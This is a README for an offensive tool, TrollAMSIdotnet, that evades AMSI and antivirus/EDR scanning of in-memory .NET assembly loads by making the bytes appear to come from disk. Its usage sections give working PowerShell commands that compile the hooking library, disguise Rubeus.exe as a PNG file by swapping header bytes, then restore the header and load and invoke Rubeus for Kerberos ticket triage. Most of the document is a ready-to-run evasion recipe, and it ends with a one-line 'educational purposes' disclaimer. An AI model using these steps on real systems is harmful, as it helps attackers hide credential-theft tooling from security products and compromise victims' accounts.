# TrollAMSIdotnet
TrollAMSI only bypasses powershell's amsi and not the CLR amsi during Assembly.Load(). Was looking for a troll way to do this but seems like already done in the most epic way possible: https://github.com/G0ldenGunSec/SharpTransactedLoad. Read his blog for full details on his ingenious approach to bypassing amsi. G0ldenGunSec's implementation uses easyhook.dll for hooking which inturn requires cody fostura. Due to the proliferated use of both libraries in offensive security projects, they have been signaturized. Decided to re-write the hooking aspect to make it opsec safer. Ended up just copy pasting code to create a single .cs file for convenience. 

**Note:** Only .cs version released, you can just compile it to an assembly and load it (refer to instructions below) 

## Why is this technique so powerful? (i.e works on many powerful AV/EDR)
Because even if you bypass amsi, when you do any sort of assembly.load, the byte array is scanned during virtualalloc, etc by the AV/EDR. This spoofs a byte array to appear on disk and the AV/EDR will not re-scan the byte array due to unnecessary overhead, since it is already assumed to be scanned when on disk. 

![Image](https://github.com/user-attachments/assets/c893ef11-20a5-455a-a62c-1d6a717884fe)
## Usage Trollamsidotnet.cs
```
#First download TrollAmsiDOTNET.cs and dog.png (taken from flangvik/SharpCollection nightly build, you can sha1 the bytes before loading to check)

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /optimize /out:TrollAmsiDOTNET.dll /target:library TrollAmsiDOTNET.cs > $null
$MZHeader = [byte[]](0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00)
$fileBytes = [System.IO.File]::ReadAllBytes("C:\troll\dog.png")
for ($i = 0; $i -lt 8; $i++) {$fileBytes[$i] = $MZHeader[$i] }
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\troll\TrollAmsiDOTNET.dll")) > $null
#[string[]]$myargs = "triage","/consoleoutfile:C:\troll\hehe.txt"
[string[]]$myargs = "triage"
$entryPoint = ([TrollAmsiDOTNET]::SpoofFileLoad($fileBytes,"Rubeus.exe")).EntryPoint
$entryPoint.Invoke($null, (,$myargs))

```
## Usage Trollamsidotnet2.cs
```
#This is a more generic library for Trollamsidotnet that works spoofs any files/path (not just assemblies) 
#Any attempt to read from <path> will now read the $filebytes, so LoadFrom(<path>) works as well
#<path\file> can already exist or not, but you must be able to write to that path, so desktop is good to start with

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /optimize /out:TrollAmsiDOTNET2.dll /target:library TrollAmsiDOTNET2.cs > $null
$MZHeader = [byte[]](0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00)
$fileBytes = [System.IO.File]::ReadAllBytes("C:\troll\dog.png")
for ($i = 0; $i -lt 8; $i++) {$fileBytes[$i] = $MZHeader[$i] }
$path = "c:\users\admin\desktop\blah.txt"
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\troll\TrollAmsiDOTNET2.dll")) > $null
[TrollAmsiDOTNET2]::SpoofFileOnDisk($path, $fileBytes)

#Do **standard** loading of assembly with LoadFrom and invoke entrypoint
$entryPoint = ([System.Reflection.Assembly]::LoadFrom($path)).EntryPoint
[string[]]$myargs = "triage"
$entryPoint.Invoke($null, (,$myargs))

```

## Code to change MZ header to PNG header 
```
$infile = "C:\troll\Rubeus.exe"
$outfile = "C:\troll\dog.png"
$pngMagicBytes = [byte[]](0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A)
$fileBytes = [System.IO.File]::ReadAllBytes($infile)
for ($i = 0; $i -lt 8; $i++) {$fileBytes[$i] = $pngMagicBytes[$i] }
[System.IO.File]::WriteAllBytes($outfile, $fileBytes)
```

## Disclaimer
Should only be used for educational purposes!
